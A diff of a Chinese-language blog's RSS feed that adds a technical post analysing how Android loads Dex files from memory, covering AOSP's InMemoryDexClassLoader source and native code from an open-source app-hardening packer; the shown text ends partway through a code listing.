@@ -5,8 +5,838 @@
     <description>Recent content in syang&#39;s blog on syang&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Thu, 09 Jan 2020 20:29:44 +0800</lastBuildDate>
+    <lastBuildDate>Wed, 22 Jan 2020 11:10:21 +0800</lastBuildDate>
     <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>论如何加载内存中的 Dex</title>
+      <link>https://syang-ng.github.io/2020/01/load-dex-in-memory/</link>
+      <pubDate>Wed, 22 Jan 2020 11:10:21 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/2020/01/load-dex-in-memory/</guid>
+      <description>
+
+&lt;p&gt;从内存中加载 Dex 是近年来一个比较热门的需求，无论是 Android 加固的内存不落地实现，还是 Android 插件化、热修复等技术等的应用，都需要实现一个 ClassLoader 能主动从内存中加载 Dex 文件。而之前通用的做法大多数是通过自定义 ClassLoader + Hook ART/Dalvik 虚拟机实现，但在 Android 8.0 后，谷歌官方推出了可以从内存中加载 Dex 的 InMemoryDexClassLoader 来实现这一目标。本文旨在深入分析这两者的异同 XD&lt;/p&gt;
+
+&lt;p&gt;PS：写到一半的途中发现由于贴了过多的代码导致文章显得非常冗长，阅读可能需要一定耐心 (･_･;&lt;/p&gt;
+
+&lt;h2 id=&#34;inmemorydexclassloader&#34;&gt;InMemoryDexClassLoader&lt;/h2&gt;
+
+&lt;p&gt;首先直接看源代码（android-8.0.0_r1），可以看到 InMemoryDexClassLoader 是 BaseDexClassLoader 的子类：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-Java&#34;&gt;public final class InMemoryDexClassLoader extends BaseDexClassLoader {
+    public InMemoryDexClassLoader(@NonNull ByteBuffer @NonNull [] dexBuffers,
+            @Nullable String librarySearchPath, @Nullable ClassLoader parent) {
+        super(dexBuffers, librarySearchPath, parent);
+    }
+
+    public InMemoryDexClassLoader(@NonNull ByteBuffer @NonNull [] dexBuffers,
+            @Nullable ClassLoader parent) {
+        this(dexBuffers, null, parent);
+    }
+
+    public InMemoryDexClassLoader(@NonNull ByteBuffer dexBuffer, @Nullable ClassLoader parent) {
+        this(new ByteBuffer[] { dexBuffer }, parent);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Emmm，看来是直接丢给父类处理了，继续跟进查看父类的定义：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class BaseDexClassLoader extends ClassLoader {
+		// …… 省略其他
+    public BaseDexClassLoader(ByteBuffer[] dexFiles, ClassLoader parent) {
+        // TODO We should support giving this a library search path maybe.
+        super(parent);
+        this.pathList = new DexPathList(this, dexFiles);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到 &lt;code&gt;DexPathList&lt;/code&gt; 这个类也相应跟进了使用 ByteBuffer 数组来创建内存中的 Dex，继续跟进该函数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public DexPathList(ClassLoader definingContext, ByteBuffer[] dexFiles) {
+  if (definingContext == null) {
+    throw new NullPointerException(&amp;quot;definingContext == null&amp;quot;);
+  }
+  if (dexFiles == null) {
+    throw new NullPointerException(&amp;quot;dexFiles == null&amp;quot;);
+  }
+  if (Arrays.stream(dexFiles).anyMatch(v -&amp;gt; v == null)) {
+    throw new NullPointerException(&amp;quot;dexFiles contains a null Buffer!&amp;quot;);
+  }
+
+  this.definingContext = definingContext;
+  // TODO It might be useful to let in-memory dex-paths have native libraries.
+  this.nativeLibraryDirectories = Collections.emptyList();
+  this.systemNativeLibraryDirectories =
+    splitPaths(System.getProperty(&amp;quot;java.library.path&amp;quot;), true);
+  this.nativeLibraryPathElements = makePathElements(this.systemNativeLibraryDirectories);
+
+  ArrayList&amp;lt;IOException&amp;gt; suppressedExceptions = new ArrayList&amp;lt;IOException&amp;gt;();
+  this.dexElements = makeInMemoryDexElements(dexFiles, suppressedExceptions);
+  if (suppressedExceptions.size() &amp;gt; 0) {
+    this.dexElementsSuppressedExceptions =
+      suppressedExceptions.toArray(new IOException[suppressedExceptions.size()]);
+  } else {
+    dexElementsSuppressedExceptions = null;
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;那么很明显就是 &lt;code&gt;makeInMemoryDexElements&lt;/code&gt; 函数了，继续查看该函数实现：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private static Element[] makeInMemoryDexElements(ByteBuffer[] dexFiles,
+                                                 List&amp;lt;IOException&amp;gt; suppressedExceptions) {
+  Element[] elements = new Element[dexFiles.length];
+  int elementPos = 0;
+  for (ByteBuffer buf : dexFiles) {
+    try {
+      DexFile dex = new DexFile(buf);
+      elements[elementPos++] = new Element(dex);
+    } catch (IOException suppressed) {
+      System.logE(&amp;quot;Unable to load dex file: &amp;quot; + buf, suppressed);
+      suppressedExceptions.add(suppressed);
+    }
+  }
+  if (elementPos != elements.length) {
+    elements = Arrays.copyOf(elements, elementPos);
+  }
+  return elements;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;直接调用了 DexFile 的构造函数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;DexFile(ByteBuffer buf) throws IOException {
+  mCookie = openInMemoryDexFile(buf);
+  mInternalCookie = mCookie;
+  mFileName = null;
+}
+
+private static Object openInMemoryDexFile(ByteBuffer buf) throws IOException {
+  if (buf.isDirect()) {
+    return createCookieWithDirectBuffer(buf, buf.position(), buf.limit());
+  } else {
+    return createCookieWithArray(buf.array(), buf.position(), buf.limit());
+  }
+}
+
+private static native Object createCookieWithDirectBuffer(ByteBuffer buf, int start, int end);
+private static native Object createCookieWithArray(byte[] buf, int start, int end);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到这里程序就进入了 native 逻辑，相应实现在 art/runtime/native/dalvik_system_DexFile.cc：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static jobject DexFile_createCookieWithDirectBuffer(JNIEnv* env,
+                                                    jclass,
+                                                    jobject buffer,
+                                                    jint start,
+                                                    jint end) {
+  uint8_t* base_address = reinterpret_cast&amp;lt;uint8_t*&amp;gt;(env-&amp;gt;GetDirectBufferAddress(buffer));
+  if (base_address == nullptr) {
+    ScopedObjectAccess soa(env);
+    ThrowWrappedIOException(&amp;quot;dexFileBuffer not direct&amp;quot;);
+    return 0;
+  }
+
+  std::unique_ptr&amp;lt;MemMap&amp;gt; dex_mem_map(AllocateDexMemoryMap(env, start, end));
+  if (dex_mem_map == nullptr) {
+    DCHECK(Thread::Current()-&amp;gt;IsExceptionPending());
+    return 0;
+  }
+
+  size_t length = static_cast&amp;lt;size_t&amp;gt;(end - start);
+  memcpy(dex_mem_map-&amp;gt;Begin(), base_address, length);
+  return CreateSingleDexFileCookie(env, std::move(dex_mem_map));
+}
+
+static jobject DexFile_createCookieWithArray(JNIEnv* env,
+                                             jclass,
+                                             jbyteArray buffer,
+                                             jint start,
+                                             jint end) {
+  std::unique_ptr&amp;lt;MemMap&amp;gt; dex_mem_map(AllocateDexMemoryMap(env, start, end));
+  if (dex_mem_map == nullptr) {
+    DCHECK(Thread::Current()-&amp;gt;IsExceptionPending());
+    return 0;
+  }
+
+  auto destination = reinterpret_cast&amp;lt;jbyte*&amp;gt;(dex_mem_map.get()-&amp;gt;Begin());
+  env-&amp;gt;GetByteArrayRegion(buffer, start, end - start, destination);
+  return CreateSingleDexFileCookie(env, std::move(dex_mem_map));
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这两个函数最终的目的都是将 java 中的 byte 数组转为 native 层的 MemoryMap，然后通过  &lt;code&gt;CreateSingleDexFileCookie&lt;/code&gt;  获得相应的 Cookie：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static jobject CreateSingleDexFileCookie(JNIEnv* env, std::unique_ptr&amp;lt;MemMap&amp;gt; data) {
+  std::unique_ptr&amp;lt;const DexFile&amp;gt; dex_file(CreateDexFile(env, std::move(data)));
+  if (dex_file.get() == nullptr) {
+    DCHECK(env-&amp;gt;ExceptionCheck());
+    return nullptr;
+  }
+  std::vector&amp;lt;std::unique_ptr&amp;lt;const DexFile&amp;gt;&amp;gt; dex_files;
+  dex_files.push_back(std::move(dex_file));
+  return ConvertDexFilesToJavaArray(env, nullptr, dex_files);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最终 Cookie 由 &lt;code&gt;ConvertDexFilesToJavaArray&lt;/code&gt; 生成（没错，这个版本的 cookie 就是 jlongArray 类型）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static jlongArray ConvertDexFilesToJavaArray(JNIEnv* env,
+                                             const OatFile* oat_file,
+                                             std::vector&amp;lt;std::unique_ptr&amp;lt;const DexFile&amp;gt;&amp;gt;&amp;amp; vec) {
+  // Add one for the oat file.
+  jlongArray long_array = env-&amp;gt;NewLongArray(static_cast&amp;lt;jsize&amp;gt;(kDexFileIndexStart + vec.size()));
+  if (env-&amp;gt;ExceptionCheck() == JNI_TRUE) {
+    return nullptr;
+  }
+
+  jboolean is_long_data_copied;
+  jlong* long_data = env-&amp;gt;GetLongArrayElements(long_array, &amp;amp;is_long_data_copied);
+  if (env-&amp;gt;ExceptionCheck() == JNI_TRUE) {
+    return nullptr;
+  }
+
+  long_data[kOatFileIndex] = reinterpret_cast&amp;lt;uintptr_t&amp;gt;(oat_file);
+  for (size_t i = 0; i &amp;lt; vec.size(); ++i) {
+    long_data[kDexFileIndexStart + i] = reinterpret_cast&amp;lt;uintptr_t&amp;gt;(vec[i].get());
+  }
+
+  env-&amp;gt;ReleaseLongArrayElements(long_array, long_data, 0);
+  if (env-&amp;gt;ExceptionCheck() == JNI_TRUE) {
+    return nullptr;
+  }
+
+  // Now release all the unique_ptrs.
+  for (auto&amp;amp; dex_file : vec) {
+    dex_file.release();
+  }
+
+  return long_array;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最后看一下是如何生存 Dex 结构的，可以看到 &lt;code&gt;DexFile::Open&lt;/code&gt; 允许传入之前生成的MemoryMap结构： &lt;code&gt;dex_mem_map&lt;/code&gt;，代码如下。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// art/runtime/native/dalvik_system_DexFile.cc
+static const DexFile* CreateDexFile(JNIEnv* env, std::unique_ptr&amp;lt;MemMap&amp;gt; dex_mem_map) {
+  std::string location = StringPrintf(&amp;quot;Anonymous-DexFile@%p-%p&amp;quot;,
+                                      dex_mem_map-&amp;gt;Begin(),
+                                      dex_mem_map-&amp;gt;End());
+  std::string error_message;
+  std::unique_ptr&amp;lt;const DexFile&amp;gt; dex_file(DexFile::Open(location,
+                                                        0,
+                                                        std::move(dex_mem_map),
+                                                        /* verify */ true,
+                                                        /* verify_location */ true,
+                                                        &amp;amp;error_message));
+  if (dex_file == nullptr) {
+    ScopedObjectAccess soa(env);
+    ThrowWrappedIOException(&amp;quot;%s&amp;quot;, error_message.c_str());
+    return nullptr;
+  }
+
+  if (!dex_file-&amp;gt;DisableWrite()) {
+    ScopedObjectAccess soa(env);
+    ThrowWrappedIOException(&amp;quot;Failed to make dex file read-only&amp;quot;);
+    return nullptr;
+  }
+
+  return dex_file.release();
+}
+
+// art/runtime/dex_file.cc
+std::unique_ptr&amp;lt;const DexFile&amp;gt; DexFile::Open(const std::string&amp;amp; location,
+                                             uint32_t location_checksum,
+                                             std::unique_ptr&amp;lt;MemMap&amp;gt; map,
+                                             bool verify,
+                                             bool verify_checksum,
+                                             std::string* error_msg) {
+  ScopedTrace trace(std::string(&amp;quot;Open dex file from mapped-memory &amp;quot;) + location);
+  CHECK(map.get() != nullptr);
+
+  if (map-&amp;gt;Size() &amp;lt; sizeof(DexFile::Header)) {
+    *error_msg = StringPrintf(
+        &amp;quot;DexFile: failed to open dex file &#39;%s&#39; that is too short to have a header&amp;quot;,
+        location.c_str());
+    return nullptr;
+  }
+
+  std::unique_ptr&amp;lt;DexFile&amp;gt; dex_file = OpenCommon(map-&amp;gt;Begin(),
+                                                 map-&amp;gt;Size(),
+                                                 location,
+                                                 location_checksum,
+                                                 kNoOatDexFile,
+                                                 verify,
+                                                 verify_checksum,
+                                                 error_msg);
+  if (dex_file != nullptr) {
+    dex_file-&amp;gt;mem_map_.reset(map.release());
+  }
+  return dex_file;
+}
+
+std::unique_ptr&amp;lt;DexFile&amp;gt; DexFile::OpenCommon(const uint8_t* base,
+                                             size_t size,
+                                             const std::string&amp;amp; location,
+                                             uint32_t location_checksum,
+                                             const OatDexFile* oat_dex_file,
+                                             bool verify,
+                                             bool verify_checksum,
+                                             std::string* error_msg,
+                                             VerifyResult* verify_result) {
+  if (verify_result != nullptr) {
+    *verify_result = VerifyResult::kVerifyNotAttempted;
+  }
+  std::unique_ptr&amp;lt;DexFile&amp;gt; dex_file(new DexFile(base,
+                                                size,
+                                                location,
+                                                location_checksum,
+                                                oat_dex_file));
+  if (dex_file == nullptr) {
+    *error_msg = StringPrintf(&amp;quot;Failed to open dex file &#39;%s&#39; from memory: %s&amp;quot;, location.c_str(),
+                              error_msg-&amp;gt;c_str());
+    return nullptr;
+  }
+  if (!dex_file-&amp;gt;Init(error_msg)) {
+    dex_file.reset();
+    return nullptr;
+  }
+  if (verify &amp;amp;&amp;amp; !DexFileVerifier::Verify(dex_file.get(),
+                                         dex_file-&amp;gt;Begin(),
+                                         dex_file-&amp;gt;Size(),
+                                         location.c_str(),
+                                         verify_checksum,
+                                         error_msg)) {
+    if (verify_result != nullptr) {
+      *verify_result = VerifyResult::kVerifyFailed;
+    }
+    return nullptr;
+  }
+  if (verify_result != nullptr) {
+    *verify_result = VerifyResult::kVerifySucceeded;
+  }
+  return dex_file;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最终调用了 DexFile 的构造函数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;DexFile::DexFile(const uint8_t* base,
+                 size_t size,
+                 const std::string&amp;amp; location,
+                 uint32_t location_checksum,
+                 const OatDexFile* oat_dex_file)
+    : begin_(base),
+      size_(size),
+      location_(location),
+      location_checksum_(location_checksum),
+      header_(reinterpret_cast&amp;lt;const Header*&amp;gt;(base)),
+      string_ids_(reinterpret_cast&amp;lt;const StringId*&amp;gt;(base + header_-&amp;gt;string_ids_off_)),
+      type_ids_(reinterpret_cast&amp;lt;const TypeId*&amp;gt;(base + header_-&amp;gt;type_ids_off_)),
+      field_ids_(reinterpret_cast&amp;lt;const FieldId*&amp;gt;(base + header_-&amp;gt;field_ids_off_)),
+      method_ids_(reinterpret_cast&amp;lt;const MethodId*&amp;gt;(base + header_-&amp;gt;method_ids_off_)),
+      proto_ids_(reinterpret_cast&amp;lt;const ProtoId*&amp;gt;(base + header_-&amp;gt;proto_ids_off_)),
+      class_defs_(reinterpret_cast&amp;lt;const ClassDef*&amp;gt;(base + header_-&amp;gt;class_defs_off_)),
+      method_handles_(nullptr),
+      num_method_handles_(0),
+      call_site_ids_(nullptr),
+      num_call_site_ids_(0),
+      oat_dex_file_(oat_dex_file) {
+  CHECK(begin_ != nullptr) &amp;lt;&amp;lt; GetLocation();
+  CHECK_GT(size_, 0U) &amp;lt;&amp;lt; GetLocation();
+  // Check base (=header) alignment.
+  // Must be 4-byte aligned to avoid undefined behavior when accessing
+  // any of the sections via a pointer.
+  CHECK_ALIGNED(begin_, alignof(Header));
+
+  InitializeSectionsFromMapList();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;该方案和原有 DexClassLoader 实现的差异，可以参考文章 &lt;a href=&#34;[http://zjutkz.net/2018/01/25/InMemoryDexClassLoader%E6%BA%90%E7%A0%81%E6%8E%A2%E7%A9%B6/](http://zjutkz.net/2018/01/25/InMemoryDexClassLoader源码探究/)&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;InMemoryDexClassLoader探究&lt;/a&gt;，这里不再赘叙。&lt;/p&gt;
+
+&lt;h2 id=&#34;非官方内存不落地实现&#34;&gt;非官方内存不落地实现&lt;/h2&gt;
+
+&lt;p&gt;在 Android 8.0 之前，InMemoryClassLoader 并不存在，那么用什么方式来实现加载内存中的  Dex？&lt;/p&gt;
+
+&lt;p&gt;用于参考的项目地址：&lt;a href=&#34;https://github.com/woxihuannisja/Bangcle&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/woxihuannisja/Bangcle&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;以下是作者的描述：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
+
+&lt;p&gt;Dalvik下的动态加载方法使用的是我这篇文章的方案 &lt;a href=&#34;https://bbs.pediy.com/thread-215078.htm，&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://bbs.pediy.com/thread-215078.htm，&lt;/a&gt;
+Art 下提供了2种方案，
+方案一是 call libart下的OpenMemory函数，如何将java的mCookie和c层的cookie联系起来是一个难点，
+方案二是 使用elf Hook来实现 ，由于在Nougat+上dlsym openMemory失败，还有dex_location和dex_cache_location的路径检查，使用方案一有些问题。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;首先来看最关键的两个函数 &lt;a href=&#34;https://github.com/woxihuannisja/Bangcle/blob/master/jni/packer.cpp：&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/woxihuannisja/Bangcle/blob/master/jni/packer.cpp：&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;native_attachBaseContext&lt;/li&gt;
+&lt;li&gt;native_onCreate&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;这两个函数主要实现了 attachBaseContext 和 onCreate 的逻辑。按函数的执行顺序，先看 &lt;code&gt;native_attachBaseContext&lt;/code&gt;：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void native_attachBaseContext(JNIEnv *env, jobject thiz, jobject ctx)
+{
+#if defined(__arm__)
+    LOGD(&amp;quot;[+]Running arm libdexload&amp;quot;);
+#elif defined(__aarch64__)
+    LOGD(&amp;quot;[+]Running aarch64 libdexload&amp;quot;);
+
+#endif
+
+    jclass ApplicationClass = env-&amp;gt;GetObjectClass(ctx);
+    jmethodID getFilesDir = env-&amp;gt;GetMethodID(ApplicationClass, &amp;quot;getFilesDir&amp;quot;, &amp;quot;()Ljava/io/File;&amp;quot;);
+    jobject File_obj = env-&amp;gt;CallObjectMethod(ctx, getFilesDir);
+    jclass FileClass = env-&amp;gt;GetObjectClass(File_obj);
+
+    jmethodID getAbsolutePath = env-&amp;gt;GetMethodID(FileClass, &amp;quot;getAbsolutePath&amp;quot;, &amp;quot;()Ljava/lang/String;&amp;quot;);
+    jstring data_file_dir = static_cast&amp;lt;jstring&amp;gt;(env-&amp;gt;CallObjectMethod(File_obj, getAbsolutePath));
+
+    g_file_dir = env-&amp;gt;GetStringUTFChars(data_file_dir, NULL);
+    //g_file_dir_backup=g_file_dir;
+    LOGD(&amp;quot;[+]FilesDir:%s&amp;quot;, g_file_dir);
+    env-&amp;gt;DeleteLocalRef(data_file_dir);
+    env-&amp;gt;DeleteLocalRef(File_obj);
+    env-&amp;gt;DeleteLocalRef(FileClass);
+
+    // NativeLibraryDir
+    jmethodID getApplicationInfo = env-&amp;gt;GetMethodID(ApplicationClass, &amp;quot;getApplicationInfo&amp;quot;,
+                                                    &amp;quot;()Landroid/content/pm/ApplicationInfo;&amp;quot;);
+    jobject ApplicationInfo_obj = env-&amp;gt;CallObjectMethod(ctx, getApplicationInfo);
+    jclass ApplicationInfoClass = env-&amp;gt;GetObjectClass(ApplicationInfo_obj);
+    jfieldID nativeLibraryDir_field = env-&amp;gt;GetFieldID(ApplicationInfoClass, &amp;quot;nativeLibraryDir&amp;quot;, &amp;quot;Ljava/lang/String;&amp;quot;);
+    jstring nativeLibraryDir = (jstring)(env-&amp;gt;GetObjectField(ApplicationInfo_obj, nativeLibraryDir_field));
+
+    g_NativeLibDir = env-&amp;gt;GetStringUTFChars(nativeLibraryDir, NULL);
+    LOGD(&amp;quot;[+]NativeLibDir:%s&amp;quot;, g_NativeLibDir);
+
+    env-&amp;gt;DeleteLocalRef(nativeLibraryDir);
+    env-&amp;gt;DeleteLocalRef(ApplicationInfoClass);
+    env-&amp;gt;DeleteLocalRef(ApplicationInfo_obj);
+
+    jmethodID getPackageResourcePath = env-&amp;gt;GetMethodID(ApplicationClass, &amp;quot;getPackageResourcePath&amp;quot;, &amp;quot;()Ljava/lang/String;&amp;quot;);
+
+    jstring mPackageFilePath = static_cast&amp;lt;jstring&amp;gt;(env-&amp;gt;CallObjectMethod(ctx, getPackageResourcePath));
+    const char *cmPackageFilePath = env-&amp;gt;GetStringUTFChars(mPackageFilePath, NULL);
+    g_PackageResourcePath = const_cast&amp;lt;char *&amp;gt;(cmPackageFilePath);
+    LOGD(&amp;quot;[+]PackageResourcePath:%s&amp;quot;, g_PackageResourcePath);
+    env-&amp;gt;DeleteLocalRef(mPackageFilePath);
+
+    jmethodID getPackageName = env-&amp;gt;GetMethodID(ApplicationClass, &amp;quot;getPackageName&amp;quot;, &amp;quot;()Ljava/lang/String;&amp;quot;);
+    jstring PackageName = static_cast&amp;lt;jstring&amp;gt;(env-&amp;gt;CallObjectMethod(ctx, getPackageName));
+    const char *packagename = env-&amp;gt;GetStringUTFChars(PackageName, NULL);
+    g_pkgName = (char *)packagename;
+    LOGD(&amp;quot;[+]g_pkgName :%s&amp;quot;, g_pkgName);
+    env-&amp;gt;DeleteLocalRef(PackageName);
+
+    char jiaguPath[256] = {0}; // 加密dex的存储路径
+
+    sprintf(g_jiagu_dir, &amp;quot;%s/%s&amp;quot;, g_file_dir, PACKER_MAGIC);
+    sprintf(jiaguPath, &amp;quot;%s/%s&amp;quot;, g_jiagu_dir, JIAMI_MAGIC);
+    LOGD(&amp;quot;[+]g_jiagu_dir:%s,jiaguPath:%s&amp;quot;, g_jiagu_dir, jiaguPath);
+    if (access(g_jiagu_dir, F_OK) != 0)
+    {
+        if (mkdir(g_jiagu_dir, 0755) == -1)
+        {
+            LOGE(&amp;quot;[-]mkdir %s error:%s&amp;quot;, g_jiagu_dir, strerror(errno));
+        }
+    }
+    //从assets目录提取加密dex
+    extract_file(env, ctx, jiaguPath, JIAMI_MAGIC);
+    mem_loadDex(env, ctx, jiaguPath);
+} // native_attachBaseContext
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到大部分操作都是为了获得程序路径等关键属性，主要执行的函数为 &lt;code&gt;extract_file(env, ctx, jiaguPath, JIAMI_MAGIC);&lt;/code&gt; 和 &lt;code&gt;mem_loadDex(env, ctx, jiaguPath);&lt;/code&gt; ，分别是提取 dex 文件以及在内存中加载 dex 文件。&lt;/p&gt;
+
+&lt;p&gt;下面看 &lt;code&gt;native_onCreate&lt;/code&gt; 函数，对 Android 加固有研究的可以看到，这段代码主要实现的就是利用 JNI 实现 Application 和 Context 的替换：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void native_onCreate(JNIEnv *env, jobject thiz, jobject instance)
+{
+    LOGD(&amp;quot;[+]native onCreate is called&amp;quot;);
+    jclass ProxyApplicationClass = env-&amp;gt;GetObjectClass(instance);
+    jmethodID getPackageManager = env-&amp;gt;GetMethodID(ProxyApplicationClass, &amp;quot;getPackageManager&amp;quot;, &amp;quot;()Landroid/content/pm/PackageManager;&amp;quot;);
+    if (env-&amp;gt;ExceptionCheck())
+    {
+        LOGE(&amp;quot;[-]find getPackageManager methodID failed&amp;quot;);
+        return;
+    }
+    jobject packageManager = env-&amp;gt;CallObjectMethod(instance, getPackageManager);
+    if (env-&amp;gt;ExceptionCheck())
+    {
+        LOGE(&amp;quot;[-]call getPackageManager method failed&amp;quot;);
+        return;
+    }
+    jmethodID pmGetApplicationInfo = env-&amp;gt;GetMethodID(env-&amp;gt;GetObjectClass(packageManager), &amp;quot;getApplicationInfo&amp;quot;, &amp;quot;(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;&amp;quot;);
+    jmethodID getPackageName = env-&amp;gt;GetMethodID(ProxyApplicationClass, &amp;quot;getPackageName&amp;quot;, &amp;quot;()Ljava/lang/String;&amp;quot;);
+    jobject pmAppInfo = env-&amp;gt;CallObjectMethod(packageManager, pmGetApplicationInfo, env-&amp;gt;CallObjectMethod(instance, getPackageName), 128);
+
+    jclass PackageItemInfoClass = env-&amp;gt;FindClass(&amp;quot;android/content/pm/PackageItemInfo&amp;quot;);
+
+    jfieldID metaDataField = env-&amp;gt;GetFieldID(PackageItemInfoClass, &amp;quot;metaData&amp;quot;, &amp;quot;Landroid/os/Bundle;&amp;quot;);
+    jobject metaData = env-&amp;gt;GetObjectField(pmAppInfo, metaDataField);
+    if (metaData == NULL)
+    {
+        LOGE(&amp;quot;[-]not found meta Bundle&amp;quot;);
+        return;
+    }
+
+    jmethodID bundleGetString = env-&amp;gt;GetMethodID(env-&amp;gt;GetObjectClass(metaData), &amp;quot;getString&amp;quot;, &amp;quot;(Ljava/lang/String;)Ljava/lang/String;&amp;quot;);
+    //found orignal ApplicationName
+    jstring originApplicationName = (jstring)env-&amp;gt;CallObjectMethod(metaData, bundleGetString, env-&amp;gt;NewStringUTF(&amp;quot;APP_NAME&amp;quot;));
+    if (originApplicationName == NULL)
+    {
+        LOGE(&amp;quot;[-]not found original Application Name&amp;quot;);
+        return;
+    }
+    LOGD(&amp;quot;[+]original Application Name : %s&amp;quot;, env-&amp;gt;GetStringUTFChars(originApplicationName, NULL));
+
+    //将LoadedApk中的mApplication对象替换
+    jclass ActivityThreadClass = env-&amp;gt;FindClass(&amp;quot;android/app/ActivityThread&amp;quot;);
+    jmethodID currentActivityThread = env-&amp;gt;GetStaticMethodID(ActivityThreadClass, &amp;quot;currentActivityThread&amp;quot;, &amp;quot;()Landroid/app/ActivityThread;&amp;quot;);
+    jobject activityThread = env-&amp;gt;CallStaticObjectMethod(ActivityThreadClass, currentActivityThread);
+    LOGE(&amp;quot;get ActivityThreadClass&amp;quot;);
+    //得到AppBindData
+    jfieldID mBoundApplicationField = env-&amp;gt;GetFieldID(ActivityThreadClass, &amp;quot;mBoundApplication&amp;quot;, &amp;quot;Landroid/app/ActivityThread$AppBindData;&amp;quot;);
+    jobject mBoundApplication = env-&amp;gt;GetObjectField(activityThread, mBoundApplicationField);
+    LOGE(&amp;quot;get AppBindData&amp;quot;);
+    //得到LoadedApk
+    jfieldID infoField = env-&amp;gt;GetFieldID(env-&amp;gt;GetObjectClass(mBoundApplication), &amp;quot;info&amp;quot;, &amp;quot;Landroid/app/LoadedApk;&amp;quot;);
+    jobject info = env-&amp;gt;GetObjectField(mBoundApplication, infoField);
+    LOGE(&amp;quot;get LoadedApk&amp;quot;);
+    //把LoadedApk中的成员变量private Application mApplication;置空
+    jfieldID mApplicationField = env-&amp;gt;GetFieldID(env-&amp;gt;GetObjectClass(info), &amp;quot;mApplication&amp;quot;, &amp;quot;Landroid/app/Application;&amp;quot;);
+    env-&amp;gt;SetObjectField(info, mApplicationField, NULL);
+    LOGE(&amp;quot;mApplication set null&amp;quot;);
+    //得到壳Application
+    jfieldID mInitialApplicationField = env-&amp;gt;GetFieldID(ActivityThreadClass, &amp;quot;mInitialApplication&amp;quot;, &amp;quot;Landroid/app/Application;&amp;quot;);
+    jobject mInitialApplication = env-&amp;gt;GetObjectField(activityThread, mInitialApplicationField);
+    LOGE(&amp;quot;get packer Application&amp;quot;);
+
+    //将壳Application移除
+    jfieldID mAllApplicationsField = env-&amp;gt;GetFieldID(ActivityThreadClass, &amp;quot;mAllApplications&amp;quot;, &amp;quot;Ljava/util/ArrayList;&amp;quot;);
+    jobject mAllApplications = env-&amp;gt;GetObjectField(activityThread, mAllApplicationsField);
+    jmethodID remove = env-&amp;gt;GetMethodID(env-&amp;gt;GetObjectClass(mAllApplications), &amp;quot;remove&amp;quot;, &amp;quot;(Ljava/lang/Object;)Z&amp;quot;);
+    env-&amp;gt;CallBooleanMethod(mAllApplications, remove, mInitialApplication);
+    LOGE(&amp;quot;remove packer Application&amp;quot;);
+    //得到AppBindData中的ApplicationInfo
+    jfieldID appInfoField = env-&amp;gt;GetFieldID(env-&amp;gt;GetObjectClass(mBoundApplication), &amp;quot;appInfo&amp;quot;, &amp;quot;Landroid/content/pm/ApplicationInfo;&amp;quot;);
+    jobject appInfo = env-&amp;gt;GetObjectField(mBoundApplication, appInfoField);
+    LOGE(&amp;quot;get AppBindData&#39;s ApplicationInfo&amp;quot;);
+    //得到LoadedApk中的ApplicationInfo
+    jfieldID mApplicationInfoField = env-&amp;gt;GetFieldID(env-&amp;gt;GetObjectClass(info), &amp;quot;mApplicationInfo&amp;quot;, &amp;quot;Landroid/content/pm/ApplicationInfo;&amp;quot;);
+    jobject mApplicationInfo = env-&amp;gt;GetObjectField(info, mApplicationInfoField);
+    LOGE(&amp;quot;get LoadedApk&#39;s ApplicationInfo&amp;quot;);
+    //替换掉ApplicationInfo中的className
+    jfieldID classNameField = env-&amp;gt;GetFieldID(env-&amp;gt;GetObjectClass(appInfo), &amp;quot;className&amp;quot;, &amp;quot;Ljava/lang/String;&amp;quot;);
+    env-&amp;gt;SetObjectField(appInfo, classNameField, originApplicationName);
